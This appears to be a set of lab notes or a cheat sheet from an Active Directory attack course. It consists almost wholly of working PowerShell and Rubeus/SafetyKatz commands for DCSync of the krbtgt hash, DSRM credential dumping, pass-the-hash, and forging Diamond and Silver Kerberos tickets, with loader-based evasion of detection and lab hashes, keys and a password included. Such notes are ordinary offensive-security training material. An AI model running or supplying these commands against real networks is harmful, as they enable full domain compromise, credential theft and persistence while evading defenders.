#### DCSync + obtain krbtgt
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

##### DRSM Admin
```powershell
winrs -r:dcorp-dc cmd 

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args token::elevate lsadump::evasive-sam exit"

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args token::elevate lsadump::lsa /patch exit"
```

PtH
```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f

Loader.exe -path SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"

Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1

Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```

Now run a DCSync attack on the DC itself because MDI dont care lol

```
a102ad5753f4c441e3af31c97fad86fd
```
##### Diamond Ticket
```powershell
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:student548 /password:cAyF6wTLSydnL2M7 /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

##### Silver Ticket
**OPSEC IN MIND** create a silver ticket with the ntlm of a computer account
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:b8f18421f92b4ef069829b1dfd0e10e9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```